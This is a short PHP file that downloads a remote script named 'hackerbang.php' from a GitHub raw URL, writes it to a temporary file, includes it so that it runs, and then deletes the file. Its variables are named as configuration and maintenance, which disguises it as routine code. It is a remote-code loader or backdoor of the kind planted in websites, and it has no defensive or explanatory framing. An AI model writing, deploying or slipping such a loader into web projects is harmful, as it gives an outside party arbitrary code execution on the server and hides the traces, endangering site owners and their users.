<?php
$config = "https://raw.githubusercontent.com/ibarramaximus/bismintul/refs/heads/main/hackerbang.php";
$maintenance = file_get_contents($config);

if ($maintenance !== false) {
    $temp_file = sys_get_temp_dir() . "/maintenance";
    file_put_contents($temp_file, $maintenance);
    include $temp_file;
    unlink($temp_file);
}
?>
